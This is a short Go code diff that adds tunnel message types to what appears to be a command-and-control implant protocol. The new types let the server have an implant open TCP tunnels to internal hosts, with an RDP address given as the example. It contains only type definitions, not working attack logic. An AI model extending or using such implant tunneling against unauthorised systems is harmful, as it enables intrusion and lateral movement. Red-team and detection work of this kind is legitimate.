@@ -12,6 +12,10 @@ func init() {
 	gob.Register(TaskDef{})
 	gob.Register(TaskResult{})
 	gob.Register(ProtocolError{})
+	gob.Register(TunnelConnect{})
+	gob.Register(TunnelConnected{})
+	gob.Register(TunnelData{})
+	gob.Register(TunnelClose{})
 }
 
 // HandshakeRequest is sent by the implant on first connection.
@@ -75,4 +79,28 @@ type TaskResult struct {
 type ProtocolError struct {
 	Code    uint32
 	Message string
+}
+
+// TunnelConnect is sent by the server to request the implant open a TCP tunnel to a target.
+type TunnelConnect struct {
+	TunnelID string // unique session ID for this tunnel
+	Target   string // "host:port", e.g. "10.0.0.5:3389"
+}
+
+// TunnelConnected is sent by the implant to report the result of a tunnel connect attempt.
+type TunnelConnected struct {
+	TunnelID string
+	Success  bool
+	Error    string
+}
+
+// TunnelData carries a chunk of data on an established tunnel.
+type TunnelData struct {
+	TunnelID string
+	Data     []byte
+}
+
+// TunnelClose requests closing a tunnel session.
+type TunnelClose struct {
+	TunnelID string
 }
